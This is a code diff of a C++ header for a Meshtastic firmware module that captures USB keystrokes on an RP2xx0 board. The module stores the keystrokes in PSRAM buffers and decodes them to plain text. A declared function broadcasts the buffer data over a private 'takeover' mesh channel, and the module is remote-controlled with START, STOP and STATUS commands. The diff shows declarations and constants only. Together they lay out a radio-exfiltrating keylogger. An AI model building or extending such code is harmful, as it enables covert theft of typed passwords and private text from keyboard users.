@@ -21,19 +21,42 @@
 #include "../mesh/SinglePortModule.h"
 #include "../platform/rp2xx0/usb_capture/keystroke_queue.h"
 #include "../platform/rp2xx0/usb_capture/formatted_event_queue.h"
+#include "../platform/rp2xx0/usb_capture/psram_buffer.h"
 #include "../platform/rp2xx0/usb_capture/common.h"
 #include "concurrency/OSThread.h"
 /**
- * @brief Keystroke buffer configuration
+ * @brief Keystroke buffer configuration constants
  */
-#define KEYSTROKE_BUFFER_SIZE     500
-#define EPOCH_SIZE                10
-#define DELTA_SIZE                2
-#define DELTA_MARKER              0xFF
-#define DELTA_TOTAL_SIZE          3       /* marker + 2-byte delta */
-#define DELTA_MAX_SAFE            65000
+#define KEYSTROKE_BUFFER_SIZE     500       /**< Total buffer size in bytes */
+#define EPOCH_SIZE                10        /**< Epoch timestamp size (ASCII digits) */
+#define DELTA_SIZE                2         /**< Delta value size in bytes */
+#define DELTA_MARKER              0xFF      /**< Marker byte for delta-encoded Enter keys */
+#define DELTA_TOTAL_SIZE          3         /**< Total delta encoding size (marker + 2-byte delta) */
+#define DELTA_MAX_SAFE            65000     /**< Maximum safe delta value before auto-finalization */
 #define KEYSTROKE_DATA_START      EPOCH_SIZE
 #define KEYSTROKE_DATA_END        (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)
+
+/**
+ * @brief Transmission and timing configuration constants
+ */
+#define MIN_TRANSMIT_INTERVAL_MS  6000      /**< Minimum interval between transmissions (6 seconds) */
+#define STATS_LOG_INTERVAL_MS     10000     /**< Statistics logging interval (10 seconds) */
+#define CORE1_LAUNCH_DELAY_MS     100       /**< Delay after Core1 reset before launch */
+#define RUNONCE_INTERVAL_MS       20000     /**< Module runOnce() polling interval (20 seconds) */
+
+/**
+ * @brief Buffer size configuration constants
+ */
+#define MAX_DECODED_TEXT_SIZE     600       /**< Maximum size for decoded text buffer */
+#define MAX_COMMAND_RESPONSE_SIZE 200       /**< Maximum size for command response text */
+#define MAX_LINE_BUFFER_SIZE      128       /**< Maximum size for log line buffer */
+#define MAX_COMMAND_LENGTH        32        /**< Maximum length for parsed commands */
+
+/**
+ * @brief Character encoding constants
+ */
+#define PRINTABLE_CHAR_MIN        32        /**< Minimum printable ASCII character (space) */
+#define PRINTABLE_CHAR_MAX        127       /**< Maximum printable ASCII character (DEL) */
 
 /**
  * @brief USB Capture Module command types (sent via mesh packets)
@@ -91,19 +114,12 @@ class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
     /**
      * @brief Handle received mesh packets
      * Processes remote control commands (STATUS, START, STOP, STATS)
+     * Executes commands and sends replies immediately
      *
      * @param mp Received mesh packet
      * @return ProcessMessage::STOP if handled, CONTINUE otherwise
      */
     virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;
-
-    /**
-     * @brief Generate reply to received command
-     * Called automatically when want_response flag is set
-     *
-     * @return Allocated reply packet with status/response
-     */
-    virtual meshtastic_MeshPacket *allocReply() override;
 
     // ==================== OSThread Interface ====================
 
@@ -168,6 +184,18 @@ class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
      * Called from runOnce() every 100ms
      */
     void processPSRAMBuffers();
+
+    /**
+     * @brief Decode binary keystroke buffer into human-readable text
+     * Converts raw buffer data (with delta encoding) into plain text
+     *
+     * @param buffer Source buffer with binary keystroke data
+     * @param output Destination buffer for decoded text
+     * @param max_len Maximum output buffer size
+     * @return Length of decoded text
+     */
+    size_t decodeBufferToText(const psram_keystroke_buffer_t *buffer,
+                              char *output, size_t max_len);
 
     /**
      * @brief Broadcast buffer data over the private "takeover" channel
